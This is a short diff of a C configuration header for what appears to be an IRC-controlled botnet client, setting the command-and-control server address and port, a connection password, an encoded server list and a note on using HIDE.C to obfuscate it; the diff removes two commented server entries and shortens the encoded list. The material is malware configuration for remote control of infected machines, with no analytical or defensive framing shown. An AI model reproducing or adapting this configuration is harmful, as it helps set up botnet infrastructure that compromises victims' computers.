@@ -8,15 +8,13 @@
 /* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
 /* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
 /* HAVE AN MODDED PROTOCOL IRCD!!!                       */
-//#define irc_servers  "45.32.148.245:12386"
-//#define irc_servers  "127.0.0.1:6667"
 #define irc_servers  "172.16.163.141:6667"
 #define passproto    "PASS"
 #define irc_passwd   "fuckya"
 /* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
 /* USE HIDE.C TO CREATE YOUR CRYPTED SERVER LIST    */
 #define encirc 0
-#define enc_servers ">.,C_>C>,C@<@U+<<<F>.,C_>C>,C@<>U+<<<F>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
+#define enc_servers ">.,C_>C>,>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
 #define enc_passwd  "bcdi"
 
 /* CHANNEL NAME */
